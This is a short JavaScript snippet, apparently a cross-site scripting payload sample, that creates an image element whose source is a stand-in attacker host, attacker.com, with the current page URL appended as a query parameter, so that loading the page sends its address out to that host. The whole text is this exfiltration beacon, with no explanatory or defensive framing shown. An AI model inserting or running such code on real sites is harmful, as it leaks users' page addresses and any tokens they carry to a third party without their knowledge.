let img = document.createElement("img"); 
img.src = `https://attacker.com/?referrer=${location.href}`; 
document.body.appendChild(img);
